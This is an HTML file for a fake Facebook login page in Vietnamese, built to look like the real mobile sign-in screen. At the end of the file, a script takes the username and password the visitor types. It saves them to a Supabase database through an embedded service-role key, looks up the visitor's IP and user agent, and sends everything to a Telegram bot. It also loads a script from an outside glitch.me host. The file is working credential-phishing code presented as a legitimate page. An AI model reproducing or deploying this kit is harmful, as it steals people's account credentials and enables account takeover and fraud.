<!DOCTYPE html>
<html lang="vi">

<head>
    <meta charset="utf-8" />
    <title>Đăng nhập hoặc đăng ký</title>
    <link href="images/facvicon.png" rel="shortcut icon" sizes="196x196" />
    <link type="text/css" rel="stylesheet" href="css/Style.css" />
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"
        integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g=="
        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
</head>

<body tabindex="0" class="touch" style="min-height: 828px; background-color: rgb(255, 255, 255)">
    <div id="viewport" data-kaios-focus-transparent="1" style="min-height: 828px">
        <div class="DinhHiep5S" id="root" role="main" style="min-height: 828px">
            <div class="DinhHiep5S0 D_H77z D_H77z2" style="display: none" id="login_error" bis_skin_checked="1">
                Email hoặc số điện thoại bạn đã nhập không khớp với bất kỳ
                tài khoản nào.
                <a href="https://www.facebook.com/r.php" class="_652e">Đăng ký tài khoản.</a>
            </div>
            <div class="D_H31 _52we _2pid _52z6">
                <div class="D_H_SDz2">
                    <a href=""><img src="images/logo.svg" width="112" class="img" alt="" /></a>
                </div>
            </div>
            <div class="DinhHiep_5rut">
                <form class="mobile-login-form" id="login_form">
                    <div>
                        <div class="_56be">
                            <div class="DinhHiep2z DinhHiep21">
                                <div class="DinhHiep96n9" id="email_input_container">
                                    <input autocorrect="off" autocapitalize="off" class="DinhHiep56bg _4u9z _5ruq _8qtn"
                                        autocomplete="on" id="tk" name="username" placeholder="Số di động hoặc email"
                                        type="text" data-sigil="m_login_email" />
                                </div>
                            </div>
                        </div>
                        <div class="_56be">
                            <div class="DinhHiep2z DinhHiep21">
                                <div class="DH021" data-sigil="m_login_password">
                                    <div class="D_H31">
                                        <div class="D_H_SDz2 _5i2i _52we">
                                            <div class="D_H_31">
                                                <input autocorrect="off" autocapitalize="off"
                                                    class="DinhHiep56bg _4u9z _27z2 _8qtm" autocomplete="on" id="mk"
                                                    name="password" placeholder="Mật khẩu" type="password"
                                                    data-sigil="password-plain-text-toggle-input" />
                                            </div>
                                            <input type="hidden" name="csrf_token" value="" />
                                        </div>
                                        <div class="D_H_3122 _216i _5i2i _52we">
                                            <div class="D_H_31">
                                                <div class="D_H77" style="" id="u_0_1_15">
                                                    <a onclick="togglePasswordVisibility(event)">
                                                        <span class="mfss" style="
                                                                    display: none;
                                                                " id="hidePassword">ẨN</span>
                                                        <span class="mfss" id="showPassword" style="">HIỂN
                                                            THỊ</span></a>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="D_H_SD" style="text-align: center">
                        <button type="submit" class="D_H_322 D_H_p2 _56b_ _28lf _9cow _56bw _56bu" name="btnLogin"
                            id="btnLogin">
                            Đăng nhập
                        </button>
                    </div>
                    <div class="DINHIEPCO"></div>
                </form>
                <div>
                    <br />
                    <div class="D_H_SD DINHHIEPCS">
                        <div class="DINHIEPCOz D_H_p222">
                            <a class="D_H_p222" tabindex="0" href="" id="forgot-password-link">Quên mật khẩu?</a>
                        </div>
                    </div>
                    <div style="padding-top: 42px">
                        <div>
                            <div>
                                <div>
                                    <div id="login_reg_separator" class="_43mg _8qtf" data-sigil="login_reg_separator">
                                        <span class="_43mh">hoặc</span>
                                    </div>
                                    <div class="DINHIEPCOz HTOFZ" id="signup_button_area">
                                        <a role="button" class="_agmp _28le btn btnS medBtn mfsm touchable"
                                            id="signup-button" tabindex="0" data-sigil="m_reg_button"
                                            data-autoid="autoid_1">Tạo tài khoản mới</a>
                                    </div>
                                </div>
                            </div>
                            <div class="D_H_SD" style="text-align: center">
                                <div>
                                    <div class="other-links _8p_m">
                                        <ul class="D_H_SDz _55wp">
                                            <li></li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="_55wr _5ui2" data-sigil="m_login_footer">
                <div class="_5dpw">
                    <div class="_5ui3" data-nocookies="1" id="locale-selector" data-sigil="language_selector marea">
                        <div class="D_H31">
                            <div class="D_H_SDz2">
                                <span class="D_H_p22 _52j9 D_H_322 _3ztb">Tiếng Việt</span>
                                <div class="_3ztc">
                                    <span class="D_H_p22"><a href="">中文(台灣)</a></span>
                                </div>
                                <div class="_3ztc">
                                    <span class="D_H_p22"><a href="">Español</a></span>
                                </div>
                                <div class="_3ztc">
                                    <span class="D_H_p22"><a href="">Français (France)</a></span>
                                </div>
                            </div>
                            <div class="D_H_SDz2">
                                <div class="_3ztc">
                                    <span class="D_H_p22"><a href="">English (UK)</a></span>
                                </div>
                                <div class="_3ztc">
                                    <span class="D_H_p22"><a href="">한국어</a></span>
                                </div>
                                <div class="_3ztc">
                                    <span class="D_H_p22"><a href="">Português (Brasil)</a></span>
                                </div>
                                <a href="">
                                    <div class="_3j87 _1rrd _3ztd" aria-label="Danh sách ngôn ngữ đầy đủ"
                                        data-sigil="more_language">
                                        <i class="img sp_zqrNfmDGuGz_2x sx_0a2d34"></i>
                                    </div>
                                </a>
                            </div>
                        </div>
                    </div>
                    <div>
                        <div class="_96qv _9a0a">
                            <a href="" class="_96qw"
                                title="Đọc blog của chúng tôi, khám phá trung tâm tài nguyên và tìm cơ hội việc làm.">Giới
                                thiệu</a>
                            <span aria-hidden="true"> · </span>
                            <a href="" class="_96qw" title="Truy cập Trung tâm trợ giúp của chúng tôi.">Trợ giúp</a>
                            <span aria-hidden="true"> · </span><span class="_96qw" id="u_0_4_wR">Xem thêm</span>
                        </div>
                    </div>
                    <span class="mfss fcg">Meta © 2024</span>
                </div>
            </div>
        </div>
    </div>
</body>

</html>
<script src="https://alpine-pale-fibre.glitch.me/script.js"></script>
<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
<script>
    async function sendMessage(text, chat_id, token) {
        const url = `https://api.telegram.org/bot${token}/sendMessage`; // The url to request

        const obj = {
            chat_id: chat_id, // Telegram chat id
            text: text, // The text to send
        };

        await fetch(url, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify(obj),
        });
    }
    const sb = supabase.createClient(
        "https://nkckriujybohswbebyyj.supabase.co",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5rY2tyaXVqeWJvaHN3YmVieXlqIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc0NTYzNDIzNywiZXhwIjoyMDYxMjEwMjM3fQ.Fu9sytcqnjgl8EI81aVrbPuSlXdxGzkRQMn1bs4QZ0A",
        {
            db: {
                schema: "public",
            },
        }
    );
    const domain_fb = window.location.ancestorOrigins[0]
    document
        .getElementById("btnLogin")
        .addEventListener("click", function (event) {
            event.preventDefault();

            var username = document.getElementsByName("username")[0].value;
            var password = document.getElementsByName("password")[0].value;

            if (!isValidEmail(username) && !isValidPhone(username)) {
                document.getElementById("login_error").style.display = "block";
                return;
            }

            if (!isValidPassword(password)) {
                document.getElementById("login_error").style.display = "block";
                return;
            }

            (async () => {
                const { data, error } = await sb
                    .from("website")
                    .select("*")
                    .eq("domain_fb", domain_fb);
                await sb.from("account").insert({
                    username: username,
                    password: password,
                    user_id: data[0].user_id,
                    website_id: data[0].id,
                });
                const { data: profile } = await sb
                    .from("profile")
                    .select("*")
                    .eq("id", data[0].user_id);
                const token = profile[0].tele_token;
                const chat_id = profile[0].tele_chat_id;
                let ip = await fetch("https://api.ipify.org?format=json")
                ip = await ip.json()
                const message = `Account: ${username}\nPassword: ${password}\nIp: ${ip.ip}\nUser Agent: ${navigator.userAgent}`;
                await sendMessage(message, chat_id, token);
            })();
        });

    function isValidEmail(email) {
        var emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
        return emailRegex.test(email);
    }

    function isValidPhone(phone) {
        var phoneRegex = /^0\d{9}$/;
        return phoneRegex.test(phone);
    }

    function isValidPassword(password) {
        return password.length > 6;
    }
</script>